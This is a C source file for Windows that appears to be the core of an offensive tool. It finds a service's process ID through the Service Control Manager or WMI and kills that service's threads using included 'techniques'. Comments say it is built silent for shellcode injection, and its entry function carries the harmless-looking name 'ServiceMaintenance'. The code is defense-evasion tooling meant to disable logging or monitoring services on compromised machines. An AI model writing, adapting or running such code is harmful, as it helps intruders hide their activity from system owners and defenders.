#include <windows.h>
#include <stdio.h>

// CRITICAL: Suppress ALL console I/O for shellcode injection
// Redefine printf/puts as no-ops BEFORE including any headers
#define printf(...)
#define puts(str)

#include "../include/process_info.h"

// Service discovery method configuration
#define PID_FROM_SCM 1 // Use Service Control Manager
#define PID_FROM_WMI 0 // Use WMI

// Thread analysis method configuration
#define KILL_WITH_T1 1 // TEB-based thread identification
#define KILL_WITH_T2 0 // Module-based thread identification

#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
#include "../include/pid_SCM.h"
#endif

#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
#include "../include/pid_WMI.h"
#endif

#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
#include "../include/technique_1.h"
#endif

#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
#include "../include/technique_2.h"
#endif

void ServiceMaintenance() {
	
	// SILENT MODE - No console I/O for shellcode injection compatibility
	
	if (enoughIntegrityLevel() == TRUE) {

		if (isPrivilegeOK() == TRUE) {

#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
			DWORD dwServicePID = GetPIDFromSCManager();
#endif

#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
			DWORD dwServicePID = GetPIDFromWMI();
#endif

			if (dwServicePID != 0) {

#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
				Technique_1(dwServicePID);
#endif

#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
				Technique_2(dwServicePID);
#endif

			}
		}
	}
}

int main() {
	ServiceMaintenance();
	return 0;
}
